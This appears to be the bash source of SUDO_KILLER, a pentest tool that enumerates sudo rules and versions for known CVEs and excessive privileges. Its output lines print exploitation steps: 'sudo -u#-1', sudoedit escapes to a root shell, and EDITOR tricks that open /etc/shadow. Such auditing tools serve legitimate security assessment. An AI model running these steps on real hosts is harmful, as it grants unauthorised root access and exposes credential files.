#!/bin/bash
# This script was developed to check for common misconfigurations and vulnerabilities of the sudo
# V1: Date Created : 08/12/2018
# V2: Date Created : 11/02/2020
# V3: Date Created : 20/07/2023
# Date of last modification : 28/07/2023
# @TH3xACE - BLAIS David

version="version 3.0.1"

##### (Cosmetic) Colour output
RED="\033[01;31m"    # Issues/Errors
GREEN="\033[01;32m"  # Success
YELLOW="\033[01;33m" # Warnings/Information
BLUE="\033[01;34m"   # Heading
BOLD="\033[01;01m"   # Highlight
RESET="\033[00m"     # Normal

##### help function
usage() {
  #####  echo -e " $version \n"
  printf " %s \n" "$version"
  echo -e " Example: ./sudo_killer.sh -c -r report.txt -e /tmp/  \n"

  echo "OPTIONS:"
  echo "-c  Includes CVEs related to sudo's version"
  echo "-a  Includes CVEs related to third party apps/devices"
  echo "-i  import (offline mode) from extract.sh"
  echo "-e  Include export of sudo rules / sudoers file"
  echo "-r  Enter report name"
  echo "-p        path where to save export and report"
  echo "-s        Supply user password for sudo checks (NOT SECURE)"
  #               echo "-t        Include thorough (lengthy) tests"
  echo "-h        Displays this help text"
  echo -e "\n"
  echo "Running with no options = limited scans/no output file"

  echo -e " ######################################################### "
}

#------------------------------------------------------

header() {

  cat <<"EOF"
   _____ _    _ _____   ____    _  _______ _      _      ______ _____
  / ____| |  | |  __ \ / __ \  | |/ /_   _| |    | |    |  ____|  __ \
 | (___ | |  | | |  | | |  | | | ' /  | | | |    | |    | |__  | |__) |
  \___ \| |  | | |  | | |  | | |  <   | | | |    | |    |  __| |  _  /
  ____) | |__| | |__| | |__| | | . \ _| |_| |____| |____| |____| | \ \
 |_____/ \____/|_____/ \____/  |_|\_\_____|______|______|______|_|  \_\                                  
EOF
  echo -e "${BLUE}                                                          $version${RESET}\n"

  # CANARY
}

#------------------------------------------------------

function versionToInt() {
  #   set -e
  #   local IFS=.
  #   local parts=($1)
  #   local val=$((1000000*parts[0]+1000*parts[1]+parts[2]))
  #   cnver=$val
  local IFS=.
  parts=($1)
  let val=1000000*parts[0]+1000*parts[1]+parts[2]
  cnver=$val
}

init() {
  if [ -n "$import" ]; then
    sudover=$(grep "Sudo version" "$import")
  else
    sudover=$(sudo -V 2>/dev/null | grep "Sudo version" 2>/dev/null)
  fi

  sudover1=$(echo "$sudover" | sed 's/Sudo version //g' | cut -d"p" -f 1)

  if [ -n "$sudover1" ]; then
    versionToInt "$sudover1"
  fi

  if [ -z "$cnver" ]; then
    echo "Error: The tool has not been able to convert the sudo's version!"
  fi

  if [ -n "$path" ]; then
    vpath="$path/sudo_killer-export-$(date +'%d-%m-%y')"
  else
    vpath="/tmp/sudo_killer-export-$(date +'%d-%m-%y')"
  fi

  # Create the directory
  mkdir -p "$vpath"
} # init

#------------------------------------------------------

checksudoersize() {

  file_path="/etc/sudoers"

  # Check if the file exists
  if [ -f "$file_path" ]; then
    # Get the file size in bytes using ls and awk
    file_size_bytes=$(ls -al "$file_path" | awk '{print $5}')

    # Check if the file size is between 600 bytes and 770 bytes (inclusive)
    if ((file_size_bytes >= 600 && file_size_bytes <= 770)); then
      echo -e "${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems there is no custom sudo's rules! (size) ${BOLD}${RED}[DEFAULT] ${RESET} \n"
      #echo "The file size is between 600 bytes and 770 bytes."
    else
      #echo "The file size is not between 600 bytes and 770 bytes."
      echo -e "${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems that custom sudo's rules for the current user exists! (size) ${BOLD}${RED}[CUSTOM]${RESET} \n"
    fi
  else
    echo "File not found: $file_path"
  fi

}

checksudoerstimestamp() {

maccrdate=$(ls -al /etc/ssh/ | grep -iw "ssh_host_rsa_key.pub" | awk '{print $6,$7,$8}')
sudoerscrdate=$(ls -al /etc/sudoers | awk '{print $6,$7,$8}')

  if ((maccrdate == sudoerscrdate)); then
     echo -e "${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems there is no custom sudo's rules! (timestamp) ${BOLD}${RED}[DEFAULT] ${RESET} \n"
  else
     echo -e "${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems that custom sudo's rules for the current user exists! (timestamp) ${BOLD}${RED}[CUSTOM]${RESET} \n"
  fi

}

checkcustomsecurepath() 
{
      sudosecpacth=$(echo "$cmd" 2>/dev/null | grep "secure_path=" | cut -d= -f 2 | sed 's/:/\n/g' | grep -v "bin")
      if [ "$sudosecpacth" ]; then
            echo -e "${BOLD}${YELLOW}[+] Custom Secure Path:${RESET} It seems that the secure path defined in sudoers includes custom path[s]! ${BOLD}${RED}[CUSTOM] ${RESET}"
            echo -e "[*] secure_path: $sudosecpacth \n"
      fi
 
}

intro() {
  who=$(whoami 2>/dev/null)
  where=$(hostname 2>/dev/null)
  echo -e "${BLUE} @TH3xACE - BLAIS David"
  echo -e "${BLUE} Contribute and collaborate on the KILLER project @ https://github.com/TH3xACE"
  echo -e "${RED} Please consider giving a +1 star on GitHub to show your support! "
  echo -e "\n"
  echo -e "${RED} IMPORTANT! Always run the latest version [Current: $version]. Run 'git pull' or download the project again. ${RESET}"
  echo -e "\n"
  echo -e "${BOLD}${GREEN}[+] Intro ${RESET}"
  echo -e "${BOLD}${YELLOW}Scan started at:${RESET} $(date)"
  echo -e "\n"
  echo -e "Current user: $who"
  echo -e "Current host: $where"
  echo -e "\n"

  if [ "$import" ]; then
    cmd=$(cat "$import" | grep -v "Sudo version")
  elif [ "$sudopass" ]; then
    echo -e "${RED} [+] Please enter the password of the current user: ${RESET}"
    read -s -p "[+] Password: " userpassword
    echo -e "\n*********"
    cmdwp=$(echo "$userpassword" | sudo -S -l -k 2>/dev/null)
  else
    cmd=$(sudo -l -k)
    if [ -z "$cmd" ]; then
      echo -e "${BOLD}${RED}[**] It seems that sudo's rules cannot be accessed without a password."
      echo -e "Try using the '-s' argument and provide the current user's password.${RESET}\n"
      echo -e "${BOLD}${YELLOW}[+] This can occur when there is no rule with NOPASSWD or when root has explicitly configured sudo to ask for a password to list rules.${RESET}\n"
      exit
    fi
  fi

  if [ "$report" ]; then
    echo -e "${BOLD}${YELLOW}[+] Report saved: ${RESET} $vpath/$report"
  fi

  if [ "$exports" ]; then
    echo -e "${BOLD}${YELLOW}[+] Sudo rules exported: ${RESET} $vpath/sudo_export.txt"
  fi

  checksudoersize

  checksudoerstimestamp 

  checkcustomsecurepath

  echo -e "\n"

} # intro

#------------------------------------------------------

# Helper function to check sudo permissions
check_sudo_permissions() {
  if [ -z "$sudoperms" ]; then
    sudoperms=$(sudo -S -l -k 2>/dev/null)
  fi
}

# Helper function to print sudo pwnage
print_sudo_pwnage() {
  sudopwnage=$(echo "$sudoperms" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w "$binarylist" 2>/dev/null)
  if [ "$sudopwnage" ]; then
    echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopwnage"
    echo -e "\n"
  fi
}

# Helper function to print sudo users
print_sudo_users() {
  sudo_user=$(getent group sudo | cut -d":" -f 4)
  if [ "$sudo_user" ]; then
    echo -e "${BOLD}${GREEN}[+] All users found in sudo group: ${RESET}\n$sudo_user"
    echo -e "\n"
  fi
}

checkinitial() {
  #echo -e "${BOLD}${YELLOW}================== Initial check - Quick overview ========================= ${RESET} \n"
  echo -e "${BOLD}${YELLOW}[1/21] ====== Initial check - Quick overview ====== ${RESET} \n"

  # useful binaries (thanks to https://gtfobins.github.io/)
  binarylist='cp\|nmap\|perl\|awk\|find\|bash\|sh\|man\|more\|less\|vi\|emacs\|vim\|nc\|netcat\|python\|ruby\|lua\|irb\|tar\|zip\|gdb\|pico\|scp\|git\|rvim\|script\|ash\|csh\|curl\|dash\|ed\|env\|expect\|ftp\|sftp\|node\|php\|rpm\|rpmquery\|socat\|strace\|taskset\|tclsh\|telnet\|tftp\|wget\|wish\|zsh\|ssh|grep\|csplit\|csvtool'

  ##### sudo version - check to see if there are any known vulnerabilities with this - CVE
  if [ "$sudover" ]; then
    echo -e "${BOLD}${GREEN}[+] Sudo version:${RESET}\n$sudover"
    echo -e "\n"
  fi

  ###check the timestamp
  timestamp=$(sudo -l | grep -i timestamp_timeout | sed 's/,/\n/g' | grep -i timestamp_timeout | cut -d "=" -f 2)
  echo -e "${BOLD}${GREEN}[+] Timestamp:${RESET}"
  echo -e "Timestamp is the amount of time in minutes between instances of sudo before it will re-prompt for a password."
  echo -e "${timestamp:-5} mins"
  echo -e "\n"

  # Check if sudo is possible without supplying a password
  check_sudo_permissions
  #sudoperms=$(sudo -S -l -k 2>/dev/null)

  if [ "$sudoperms" ]; then
    echo -e "${BOLD}${GREEN}[+] SUDO possible without a password!${RESET}\n\n$sudoperms"
    echo -e "\n"
  fi

  # Check if sudo is possible with a password supplied
  if [ "$sudopass" ]; then
    if [ -z "$sudoperms" ]; then
      sudoauth=$(sudo -S -l -k 2>/dev/null)
      if [ "$sudoauth" ]; then
        echo -e "${BOLD}${GREEN}[+] SUDO possible with a password supplied!${RESET}\n\n$sudoauth"
        echo -e "\n"
      fi
    fi
  fi

  # Known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma-separated values) - authenticated
  print_sudo_pwnage

  #   sudopwnage=$(echo "$sudoperms" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w "$binarylist" 2>/dev/null)
  #   if [ "$sudopwnage" ]; then
  #     echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopwnage"
  #     echo -e "\n"
  #   fi

  # Who has sudoed in the past
  whohasbeensudo=$(find /home -name .sudo_as_admin_successful 2>/dev/null)
  if [ "$whohasbeensudo" ]; then
    echo -e "[-] Accounts that have recently used sudo:\n$whohasbeensudo"
    echo -e "\n"
  fi

  # Sudo users
  print_sudo_users

  #   sudo_user=$(getent group sudo | cut -d":" -f 4)
  #   if [ "$sudo_user" ]; then
  #     echo -e "${BOLD}${GREEN}[+] All users found in sudo group: ${RESET}\n$sudo_user"
  #     echo -e "\n"
  #   fi

  #   # Check if SELinux is enabled
  #     sestatus=`sestatus 2>/dev/null`
  #     if [ "$sestatus" ]; then
  #         echo -e "[-] SELinux seems to be present: $sestatus, can execute /CVE/CVE-2017-1000367-2.c if vulnerable (Check CVEs)."
  #         echo -e "\n"
  #     fi

  # Exporting sudo rules
  if [ "$exports" ]; then
    echo "$cmd" >"$vpath/sudo_export.txt" 2>/dev/null
    echo -e "${BOLD}${GREEN}[+] Sudo rules exported!${RESET} \n$vpath/sudo_export.txt "
    echo -e "\n"
    local cmddt=$(sudo -ll)
    echo "$cmddt" >"$vpath/sudo_export_list.txt" 2>/dev/null
    echo -e "${BOLD}${GREEN}[+] Detailed Sudo rules exported!${RESET} \n$vpath/sudo_export_list.txt "
    echo -e "\n"
  fi

  # pull out vital sudoers info
  # sudoers=$(grep -v -e '^$' /etc/sudoers 2>/dev/null | grep -v "#" 2>/dev/null)
  # # Export sudoers file to export location
  # if [ "$exports" ] && [ "$sudoers" ]; then
  #     echo -e "${BOLD}${GREEN}[+] Sudoers configuration exported:${RESET}\n$sudoers"
  #     echo -e "\n"
  #     echo "$sudoers" > "$vpath/sudoers_export.txt" 2>/dev/null
  # fi

  if [ -r "/etc/sudoers" ]; then
    echo -e "${BOLD}${RED}[+] The file /etc/sudoers is readable by current user.${RESET}"
    #export sudoers file to export location
    if [ "$exports" ] && [ "$sudoers" ]; then
      cp /etc/sudoers $vpath/sudoers_export.txt 2>/dev/null
    else
      :
    fi
  fi

} # checkinitial

#------------------------------------------------------

# Function to print vulnerability information
check_cve_version() {

  echo -e "${BOLD}${GREEN}[+] Sudo version is vulnerable to the following CVEs:${RESET}"
  echo -e "${BOLD}${GREEN}[+] Despite the version being vulnerable to a CVE or several,${RESET}"
  echo -e "${BOLD}${GREEN}[+] some requirements might be needed for exploitation.\n${RESET}"

  sver_tmp=$(sudo -V 2>/dev/null | grep "Sudo version" 2>/dev/null | cut -d" " -f 3 2>/dev/null)
  version=$(echo $sver_tmp | tr -d ' ' | sed 's/P/p/g')

  # Display CVEs vulnerable based on version
  cat $PWD/CVE/cve.sudover.vuln.txt | grep "$version" | cut -d"+" -f 1,2 | awk '{print $0,"\n"}'

  cve_vuln=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep "$version" | cut -d"+" -f 1)

  if [ "$cve_vuln" ]; then
    echo -e "\n[+] Please find the following exploit(s) for some of the detected CVEs\n"
    while read -r line; do
      cvepath=$(ls -al $PWD/CVE/ | grep "$line" | tr -s " " | cut -d " " -f 9)
      if [ "$cvepath" ]; then
        echo -e "  [*] $PWD/CVE/${BOLD}${RED}$cvepath${RESET} \n"
      fi
    done <<<"$cve_vuln"
  fi
}

# function check_and_print_cve() {
#   local cve_cond="$1"
#   local cve_number="$2"
#   local sudo_intversion="$3"
#   local sudo_version="$3"
#   local description="$4"
#   local exploit_file="$5"

#   if [ "$cnver" -lt "$sudo_intversion" ]; then
#       cve_vulnerable=$(eval "echo \"\$cmd\" 2>/dev/null | $cve_cond")
#       #echo -e "$cve_cond"
#     if [ "$cve_vulnerable" ]; then
#       echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability $cve_number: ${RESET}"
#       echo -e "${BOLD}${RED}[-] Vulnerable to $cve_number${RESET}"
#       echo -e "[-] Current Sudo version: $sudover | Vulnerable version: <=$sudo_version"
#       echo -e "[-] Description: $description"
#       echo -e "[-] Exploit: /CVE/$exploit_file"
#       echo -e "\n"
#     fi
#   fi
# }

checkcve() {

  # Check for sudo version vulnerability based on CVEs
  if [ "$sudocve" ]; then
    echo -e "${BOLD}${YELLOW}[2/21] ====== Checking for disclosed vulnerabilities (CVEs) - version based ====== ${RESET} \n"
    check_cve_version
    echo -e "${BOLD}${BLUE}[@] Check [2/21] Completed!${RESET} \n"

    # ---------------------------------------------

    echo -e "${BOLD}${YELLOW}[3/21] ====== Checking for disclosed vulnerabilities (CVE) ====== ${RESET} \n"
    echo -e "${BOLD}${GREEN}[+] The prerequisites for the below CVEs have been checked (not all CVEs checked - refer to readme):${RESET}"
    echo -e "${BOLD}${RED}[+] Highly probable that sudo is VULNERABLE to the below CVEs:${RESET} \n"

    # Check for specific CVE vulnerabilities as well as their requirements

    ##### CVE-2015-5602
    ##### The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. /home/*/*/esc.txt),
    #####  this allows a malicious user to replace the esc.txt real file with a symbolic link to a different location (e.g. /etc/shadow).

    # check_and_print_cve 'grep "(root) NOPASSWD: sudoedit" | grep -F $"/*/*/"' "CVE-2015-5602" 1008015 "The bug was found in sudoedit, which does not check the full path if a wildcard is used twice." "CVE-2015-5602.sh"

    if [ "$cnver" -lt "1008015" ]; then
      sudodblwildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD: sudoedit" | grep -F $"/*/*/")
      if [ "$sudodblwildcard" ]; then
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2015-5602${RESET}"
        echo -e "${BOLD}${GREEN}[+] Sudoedit with double wildcard was detected. The bug was found in sudoedit, which does not check the full path if a wildcard is used twice. (CVE-2015-5602): ${RESET}"
        echo -e "$sudodblwildcard"
        echo -e "[-] current $sudover | vuln version: <=1.8.14"
        echo -e "[*] Exploit: /CVE/CVE-2015-5602.sh"
        echo -e "\n"
      #  echo -e "[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\n"
      fi
    fi # check version

    ##### CVE-2019-14287
    if [ "$cnver" -lt "1008027" ]; then
      sudorunas=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)")
      if [ "$sudorunas" ]; then
        cmdi=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)" | sed 's/NOPASSWD//g' | sed 's/://g' | cut -d ")" -f 2)
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2019-14287${RESET}"
        echo -e "${BOLD}${GREEN}[+] The vulnerability allows users with sudo permissions to execute arbitrary commands as root. (CVE-2019-14287): ${RESET}"
        echo -e "[-] current $sudover | vuln version: <=1.8.27"
        echo -e "[-] Example : sudo -u#-1 /usr/bin/id"
        echo -e "[-] Run command : sudo -u#-1 <cmd>"
        echo -e "[-] where <cmd> is one of the following:"
        echo -e "$cmdi"
        echo -e "[*] Exploit: /CVE/CVE-2019-14287.txt"
        echo -e "\n"
      fi
    fi

    ##### CVE-2019-18634
    if [ "$cnver" -lt "1008026" ] && [ "$cnver" -gt "1007001" ]; then
      sudopwfeedback=$(echo "$cmd" 2>/dev/null | grep " pwfeedback")
      if [ "$sudopwfeedback" ]; then
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2019-18634${RESET}"
        echo -e "${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow condition in the sudo command. (CVE-2019-18634): ${RESET}"
        echo -e "[-] current $sudover | vuln version: 1.7.1 to 1.8.25p1 inclusive"
        # echo -e "[-] Run command : perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id"
        echo -e "[-] Run command : perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id"
        echo -e "[-] if you have a segmentation fault then sudo is vulnerable"
        echo -e "[*] Notes: /exploits/pwfeedback.txt"
        echo -e "[*] Exploit: /CVE/CVE-2019-16634-pwfeedback/CVE-2019-18634.sh"
        echo -e "\n"
      fi
    fi

    #### CVE-2021-23240
    sudoedit_selinux=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep "$(echo $sver)" | grep "CVE-2021-23240" | cut -d"+" -f 1)
    if [ "$sudoedit_selinux" ]; then
      #check_psymlinks=$(cat /proc/sys/fs/protected_symlinks | grep 0)
      #if [ "$check_psymlinks" ]; then
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2021-23240${RESET}"
        echo -e "${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow condition in the sudo command. (CVE-2021-23240): ${RESET}"
        echo -e "[-] The version of sudo is vulnerable and symlinks is not protected (set to 0)"
        echo -e "[-] Provided that SELinux is in permissive (not enforcing or disables) mode (Refer to the file  /etc/selinux/) "
        echo "or the invoking user is in an unconfined domain, then only all requirements will be met for exploitation."
        echo "Permissive mode: SELinux prints warnings instead of enforcing."
        echo -e "[*] M1 : Run command: sudoedit /path then :e /etc/sudoers or :e /etc/shadow"
        echo -e "[*] M2 : Run command: S1 -> sudoedit /path then :call libcallnr("libc.so.6","setuid",0)"
        echo -e " S2 -> then run ::!bash"
        echo -e "[*] M3 : Notes: /CVE/CVE-2021-23240.txt"
        echo -e "\n"
      #fi
    fi

    #### CVE-2021-3156
    sudoescapevschk=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep "$(echo $sver)" | grep "CVE-2021-3156" | cut -d"+" -f 1)
    if [ "$sudoescapevschk" ]; then
      sudounescapeof=$(echo "$cmd" 2>/dev/null | grep -w "root) NOPASSWD:\|ALL) NOPASSWD:" | grep "sudoedit /")
      if [ "$sudounescapeof" ]; then
        sudo_escape1=$(sudoedit -s / 2>&1)
        sudo_escape=$(echo "$sudo_escape1" | grep -w "sudoedit: /: not a regular file")
        #sudo_escape=$("sudoedit -s /")
        if [ "$sudo_escape" ]; then
          echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2021-3156${RESET}"
          echo -e "${BOLD}${GREEN}[+] The vulnerability is caused by a heap-based buffer overflow vulnerability in sudo, allowing attackers to gain root-level privileges on Unix-like systems. (CVE-2021-3156): ${RESET}"
          echo -e "[-] current $sudover | vuln version: 1.7.7-1.7.10p9, 1.8.2-1.8.31p2, and 1.9.0-1.9.5p1"
          #echo -e "[*] Run command: sudoedit -s / - If output starts with { sudoedit: } vulnerable else { usage: } not vulnerable "
          #echo -e "Example of output: { sudoedit: /: not a regular file } means it is Vulnerable to CVE-2021-3156"
          echo -e "[*] Notes: CVE/CVE-2021-3156.txt"
          echo -e "[*] Exploit: refer to CVE/CVE-2021-3156/, several exploits are provided and be aware then some of them can pose some risks"
          echo -e "    to be run on production environment and most of them are version specific... read the readme/note."
          echo -e "\n"
        fi
      fi
    fi

    ### CVE-2023-22809
    sudoeditrockchk=$(cat $PWD/CVE/cve.sudover.vuln.txt | grep "$(echo $sver)" | grep "CVE-2023-22809" | cut -d"+" -f 1)
    if [ "$sudoeditrockchk" ]; then

      #sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /")
      #sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" )
      sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /\|(ALL : ALL) NOPASSWD: sudoedit\|(ALL) NOPASSWD: sudoedit" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g")
      if [ "$sudoeditrock" ]; then
        #sudo_escape=$(sudoedit -s / | grep "sudoedit:")
        #sudo_escape=$("sudoedit -s /")
        #if [ "$sudo_escape" ]; then
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
        echo -e "${BOLD}${GREEN}[+] The vulnerability allows users to run arbitrary commands by abusing sudoedit as root without authentication. (CVE-2023-22809):${RESET}"
        echo -e "[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive"
        echo -e "[*] Run one of the command (No Password Required): "
        echo -e "$sudoeditrock"
        echo -e "[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file"
        echo -e "[+] The variable EDITOR is used as default but can be also SUDO_EDITOR or VISUAL"
        echo -e "[*] Notes: /CVE/CVE-2023-22809.txt"
        #echo -e "[*] Exploit: "
        echo -e "\n"
      #fi
      fi

      sudoeditrocknp=$(echo "$cmd" 2>/dev/null | grep -i "(root) sudoedit /\|(ALL : ALL) sudoedit\|(ALL) sudoedit" | sed -e "s/(root) /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL) /EDITOR='vi -- \/etc\/shadow' /g")
      if [ "$sudoeditrocknp" ]; then
        echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
        echo -e "${BOLD}${GREEN}[-] The vulnerability allows users to run arbitrary commands by abusing sudoedit as root ${BLUE}with user authentication (password needed) ${RESET}. (CVE-2023-22809):${RESET}"
        echo -e "[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive"
        echo -e "[*] Run one of the command ${BLUE}(User's password required)${RESET}: "
        echo -e "$sudoeditrocknp"
        echo -e "[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file"
        echo -e "[+] The variable EDITOR is used as default but can be also SUDO_EDITOR or VISUAL"
        echo -e "[*] Notes: /CVE/CVE-2023-22809.txt"
        #echo -e "[*] Exploit: "
        echo -e "\n"
      fi

      #####  Check for absolute path to sudoedit
      if [ "$cnver" -lt "1008030" ]; then
        sudoeditpathcmd=$(echo "$cmd" 2>/dev/null | grep -E "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit" | cut -d " " -f 8)
        sudoeditpath=$(echo "$cmd" 2>/dev/null | grep -Eo "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit")
        if [ "$sudoeditpath" ]; then
          echo -e "${BOLD}${RED}[-] Vulnerable to sudoedit absolute path vuln${RESET}"
          echo -e "${BOLD}${GREEN}[+] Absolute path to sudoedit was found in the sudoers file: ${RESET}"
          echo -e "[-] Privilege escalation is possible if the sudo version is < 1.8.30"
          echo -e "[*] Run the command sudo $sudoeditpath <file> to invoke a file editor as root"
          echo -e "[*] where <file> is as below:"
          echo -e "$sudoeditpathcmd"
          echo -e "[-] Once you are in the editor, type the following command in command mode to get a shell"
          echo -e "[-] Run command : :set shell=/bin/sh"
          echo -e "[-] :shell"
          echo -e "[*] Then use the appropriate exploit from res/absolute_path-sudoedit.txt for the editor you invoked \n"
        fi
      fi

    fi

    echo -e "${BOLD}${BLUE}[@] Check [3/21] Completed!${RESET} \n"
  else
    echo -e "${BOLD}${YELLOW}[2/21] ====== Checking for disclosed vulnerabilities (CVEs) - version based ====== ${RESET} \n"
    echo -e "${BOLD}${RED}Checks related to CVEs were skipped. To include them use the flag -c ${RESET} \n"

    echo -e "${BOLD}${YELLOW}[3/21] ====== Checking for disclosed vulnerabilities (CVE) ====== ${RESET} \n"
    echo -e "${BOLD}${RED}Checks related to CVEs were skipped. To include them use the flag -c ${RESET} \n"
  fi # cve flag check

} # checkcve

#------------------------------------------------------
fn_excess_priv() {

  # echo -e "$cmd"
  # Detects variants of the execessive sudo rule "ALL (ALL) NOPASSWD: ALL"

  # Variant 1: user (ALL) NOPASSWD: ALL
  # regex for /etc/sudoers | grep -E '^\S+\s+\(ALL\)\s+NOPASSWD:\s+ALL'
  exprv1=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL\)\s+NOPASSWD:\s+ALL')
  if [ "$exprv1" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 1]${RESET}"
    echo -e "[-] Variant 1: $who (ALL) NOPASSWD: ALL"
    echo -e "[-] Identified rule: \n$exprv1"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user [incl root]${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Any${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 3: user (root) NOPASSWD: ALL
  # regex for /etc/sudoers | grep -E '^\S+\s+\(root\)\s+NOPASSWD:\s+ALL'
  exprv3=$(echo "$cmd" 2>/dev/null | grep -E '\(root\)\s+NOPASSWD:\s+ALL')
  if [ "$exprv3" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 3]${RESET}"
    echo -e "[-] Variant 3: $who (root) NOPASSWD: ALL"
    echo -e "[-] Identified rule: \n$exprv3"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}root${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Any${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 4/5: user (ALL) NOPASSWD: /usr/bin/command
  # regex for /etc/sudoers | grep -E '^\S+\s+\(ALL\)\s+NOPASSWD:\s+/usr/bin/\w+'
  exprv45=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL\)\s+NOPASSWD:\s+/*bin*')
  if [ "$exprv45" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 4/5]${RESET}"
    echo -e "[-] Variant 4/5: $who (ALL) NOPASSWD: */s|bin/*"
    echo -e "[-] Identified rule: \n$exprv45"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user [incl root]${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # # Variant 5: user (ALL) NOPASSWD: /bin/*
  # regex for /etc/sudoers | grep -E '^\S+\s+\(ALL\)\s+NOPASSWD:\s+/bin/\*'
  #  exprv5=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL\)\s+NOPASSWD:\s+ALL')
  #  if [ "$exprv5" ]; then
  #   echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 5]${RESET}"
  #   echo -e "[-] Variant 5: <user> (ALL) NOPASSWD: /bin/*"
  #   echo -e "[-] Identified rule: $exprv5"
  #   echo -e "[*] Notes: notes/execessive_priv.txt"
  #  fi

  # # Variant 2: %group (ALL) NOPASSWD: ALL - (ALL : ALL) NOPASSWD: ALL
  # # regex for /etc/sudoers | grep -E '^%\w+\s+\(ALL\)\s+NOPASSWD:\s+ALL'
  exprv2=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL \: ALL\)\s+NOPASSWD:\s+ALL')
  if [ "$exprv2" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 2]${RESET}"
    echo -e "[-] Variant 2: %group (ALL) NOPASSWD: ALL"
    echo -e "[-] Identified rule: \n$exprv2"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user [incl root] or group${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Any${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 6: %group (ALL) NOPASSWD: /sbin/reboot, /sbin/shutdown
  # regex for /etc/sudoers | grep -E '^%\w+\s+\(ALL\)\s+NOPASSWD:\s+/*bin/\*'
  exprv6=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL \: ALL\)\s+NOPASSWD:\s+/*bin*')
  if [ "$exprv6" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 6]${RESET}"
    echo -e "[-] Variant 6: %group (ALL) NOPASSWD: */s|bin/*"
    echo -e "[-] Identified rule: \n$exprv6"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user [incl root] or group${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 7: %group (ALL:ALL) NOPASSWD: ALL
  # echo "Variant 7: %group (ALL:ALL) NOPASSWD: ALL"
